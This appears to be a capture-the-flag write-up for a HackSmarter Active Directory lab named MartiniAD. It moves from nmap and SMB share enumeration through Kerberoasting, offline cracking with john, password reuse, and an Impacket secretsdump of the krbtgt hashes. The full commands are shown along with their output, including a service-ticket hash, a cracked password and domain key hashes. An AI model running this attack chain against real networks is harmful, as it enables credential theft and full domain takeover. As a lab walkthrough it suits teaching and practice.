---
title: "MartiniAD @ HackSmarter"
date: 2026-04-29
categories: [HackSmarter, Easy]
tags: [SMB, Kerberoasting, Secretsdump]
image:
  path: https://github.com/user-attachments/assets/e9ffe1fd-d8a2-4d2f-8add-b48846b06da2 
---

<img width="1600" height="912" alt="image" src="https://github.com/user-attachments/assets/e9ffe1fd-d8a2-4d2f-8add-b48846b06da2" />


# **Objective**

An adult beverage company "Martini Bars" recently had a corporate breach and the compliance and risk team dictates they perform a penetration test at one of their branch offices. The Hack Smarter team has been authorized to perform an internal black box pentest.

# **Initial Enumeration & Information Gathering**
I began the assessment with an Nmap scan against the target IP address 10.1.225.58 to uncover open ports and active services.

```
nmap -sV -p- 10.1.225.58
```

The scan reveals a classic Active Directory Domain Controller configuration
```
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

To easily interact with the infrastructure, we map the IP address to the target domain names inside our local /etc/hosts file:

```
echo '10.1.225.58 DRY.MARTINI.BARS DC01.DRY.MARTINI.BARS' | sudo tee -a /etc/hosts
```

# Foothold: Exploring SMB shares
With port 445 open, I utilized NetExec (nxc) to map out accessible SMB shares. An initial anonymous login check confirmed that null sessions were blocked from directly inspecting the network share contents.
```
~> /hacksmarter nxc smb 10.1.225.58 -u '' -p '' --shares
SMB         10.1.225.58     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.225.58     445    DC01             [+] DRY.MARTINI.BARS\: 
SMB         10.1.225.58     445    DC01             [*] Enumerated shares
SMB         10.1.225.58     445    DC01             Share           Permissions     Remark
SMB         10.1.225.58     445    DC01             -----           -----------     ------
SMB         10.1.225.58     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.225.58     445    DC01             C$                              Default share
SMB         10.1.225.58     445    DC01             IPC$                            Remote IPC
SMB         10.1.225.58     445    DC01             NETLOGON                        Logon server share 
SMB         10.1.225.58     445    DC01             notes                           
SMB         10.1.225.58     445    DC01             SYSVOL                          Logon server share 
```

However, checking standard default profiles revealed that the built-in `Guest` user account was active and possessed **READ** and **WRITE** permissions over a custom network share named `notes`.
```
~> /hacksmarter nxc smb 10.1.225.58 -u guest -p '' --shares
SMB         10.1.225.58     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:False) (SMBv1:None)
SMB         10.1.225.58     445    DC01             [+] DRY.MARTINI.BARS\guest: 
SMB         10.1.225.58     445    DC01             [*] Enumerated shares
SMB         10.1.225.58     445    DC01             Share           Permissions     Remark
SMB         10.1.225.58     445    DC01             -----           -----------     ------
SMB         10.1.225.58     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.225.58     445    DC01             C$                              Default share
SMB         10.1.225.58     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.225.58     445    DC01             NETLOGON                        Logon server share 
SMB         10.1.225.58     445    DC01             notes           READ,WRITE      
SMB         10.1.225.58     445    DC01             SYSVOL                          Logon server share 
```
Navigating inside the notes share, there is a file titled `notes.txt`. Inside, I discovered cleartext credentials for a user `mprice`:

<img width="412" height="239" alt="image" src="https://github.com/user-attachments/assets/30452c7f-8e61-45ff-91d5-47d3bbf75fb5" />


# Lateral Movement: Kerberoasting
Kerberoasting is an attack against the Kerberos authentication protocol that allows any authenticated domain user (even the most low-privileged account) to obtain password hashes for service accounts and crack them offline.
Using the active domain credentials for `mprice`, I queried the Domain Controller for Kerberos Service Principal Names (SPNs) via Impacket's GetUserSPNs to check for Kerberoastable users.

```
~> /hacksmarter impacket-GetUserSPNs DRY.MARTINI.BARS/mprice:'*martini*' -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName         Name        MemberOf                                                         PasswordLastSet             LastLogon  Delegation 
---------------------------  ----------  ---------------------------------------------------------------  --------------------------  ---------  ----------
HTTP/athena.dry.martini.bar  ATHENA_SVC  CN=Remote Management Users,CN=Builtin,DC=DRY,DC=MARTINI,DC=BARS  2026-01-20 12:20:32.856622  <never>               



[-] CCache file is not found. Skipping...
$krb5tgs$23$*ATHENA_SVC$DRY.MARTINI.BARS$DRY.MARTINI.BARS/ATHENA_SVC*$997efbc5494ac187b6512315470cbc9b$360b40b69ca4e35190046e6b2dd009cabbf27632b7678abd6f62c80c69ae256536a0839aebbd9464f48711dfadf0d106046ca84c6deb607b983efc4e177a76245254666b575cf2aa4cd9cff41a2708baa1105b56a4619ab561a1480ce6945e283f03fe25ecc3ef018e25d2b02fb1e9de93a83035507486bdedb618ad7305b00a656e1f67ad90f71830d25f66bd1ec5d9cffe504594270f6d73aced7d21bef4befece41f2ca5e44d37d544fc26127d9ca8492c951ecd4212cae32ba8f8b926a7ffeb52829c6d90c5069733509cae3cb734ca23da846126359528cc2e503fb3f67ec622f4386f0a0c012a131807b9b814df7f880823d39abbcc964241789efa65d83dcd5345e67e229c85e39726d0fee15b80e831e3291daed3034409a91596dc02ff4b95c4937d16dbad15bbb5d96e894a38da425e0237b95df2236f1937dbda0f213b59a29d03b7858c67764041ad7215d4e478875b7a28000a377278ed345c230004d0a558b29d6670b7dae99f4c784260c8bbd9384e566fcdf7282fc783963e4f2403232fd090d653b62b9c0039a585b2ceed83b2af9b142e334d5039be4c3d89a24baa820be5c5f15125bf6c17ace845c2585b3676515129b60316768a3f44eb4ba56291d3d7f332c96488f0946c75b77d6e21f5ee63308741a49680e7734f10c6ed86da33567b30594ad359c6ca73e7e3219b096b0ffa14defc83244362d99995fb13ee70a121adc1e7b8ff04c2e3dc554089d18b3ef36bb9b36bba56eb4212ff592708d8a88949f5246d8b2cd88a04908463c7d9f489bf87e7972eb5fe53473eed2c1686a54781444b9fdeee9df0ed7daadf899b12b97000804a22adcc3a4012bfaed48cc5a3f8d4cf3b13aeb9fd6b891206a35a87fb2aaca9df526ea1bb037a25448682299f159a71a61a52fbef76c8a785d0d8183f9100955cfa199fb90c15b4a0fcd8240c386c1184203d0103af254915a7c18760c9dab1c40575b872c462754cd7a516fd8d1015b5c18f697d2892778dcd949a12c7944e3b25563f2c47aae3dcae30f7b82c3675067c4a45cb8440e87f612533073efaec6ae17765f2f96b97a9612ad3839d6d481ca9648b9911196a67604a0cd4254ecc8418002c9de1d9669573ebeabf63252b6dd0698d74121f58d69daf256d651203456336d91dcb24981eebd16a9d7c2b1039a5c4816baedc067bd9ca2c151f2bc6ac60ce380eadeb9c82b41779eeca724d3cc22305e8e28f50ce6521d4e4b68d1777a421e53160abb18cd6abd456c6cb786f2debcefd2be61626a7a8bb87949c038ad2a062ee2b785d5d20f88127ceb030851b8f112e870b955aa571d6407010585058904443df75ce6a82a2a8d8779b01f4baad4fd07c06da4602c3be0280cee2442aa3ce5af4578cbf9056f0e02b3154d108ab9187a1815a46915b14c5cfb0b27741cbea931b46a549707bbae78e358aeccef3fcb833b1ac52eeddbf4c62dd81ddf35e2d85bd6da40ead69917545236f203647d
```

The system returned a valid service account hash linked to an administrative resource
I saved the hash to a file and cracked it with john the ripper 
```
~> /hacksmarter john  athena.hash --wordlist=/usr/share/wordlists/rockyou.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1dirtymartini    (?)     
1g 0:00:00:47 DONE (2026-05-15 14:33) 0.02124g/s 276634p/s 276634c/s 276634C/s 1dragonbal..1desmemoriado
Use the "--show" option to display all of the cracked passwords reliably
```

The hash cracked almost instantly:
`ATHENA_SVC : Password: 1dirtymartini`

With the new creds, I performed a password reuse verification check with other users in the domain and found that the user 1athena.t0` also has the same password 
```
~> /hacksmarter nxc ldap 10.1.225.58 -u athena.t0 -p '1dirtymartini' --users
LDAP        10.1.225.58     389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:DRY.MARTINI.BARS) (signing:Enforced) (channel binding:No TLS cert) 
LDAP        10.1.225.58     389    DC01             [+] DRY.MARTINI.BARS\athena.t0:1dirtymartini (Pwn3d!)
```
The validation returned a successful (Pwn3d!) status indicator, confirming that `athena.t0`possesses full Administrative permissions across the entire active domain layer.

# Post-Exploitation
With complete Domain Administrator access established, the final task dictates harvesting the core domain environment keys. I executed Impacket's secretsdump against the Domain Controller using the DRSUAPI method to pull down the krbtgt account hash values.
```
~> /hacksmarter impacket-secretsdump 'athena.t0:1dirtymartini@DC01.DRY.MARTINI.BARS' -just-dc-user krbtgt
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:22ebc290e67668629c8d0812662a9c51:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b2679af0c2283eff6926eda9fcdac99c7bc2b118158df3934a33d5f4f50baed3
krbtgt:aes128-cts-hmac-sha1-96:bfb79c68ae71254e572fd65dd34f5b5c
krbtgt:0x17:22ebc290e67668629c8d0812662a9c51
[*] Cleaning up... 
```

## Happy hacking !!!!!
